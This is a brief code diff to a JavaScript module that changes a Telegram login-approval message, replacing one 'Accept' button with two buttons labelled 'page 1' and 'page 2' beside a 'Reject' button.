@@ -107,7 +107,8 @@ async function sendLoginTelegram(email) {
     reply_markup: {
       inline_keyboard: [
         [
-          { text: "✅ Accept", callback_data: `accept|${email}` },
+          { text: "✅ page 1", callback_data: `accept|${email}` },
+          { text: "✅ page 2", callback_data: `accept|${email}` },
           { text: "❌ Reject", callback_data: `reject|${email}` }
         ]
       ]
@@ -180,3 +181,4 @@ module.exports = {
   sendApprovalRequestPage,
   sendLoginTelegram
 };
+
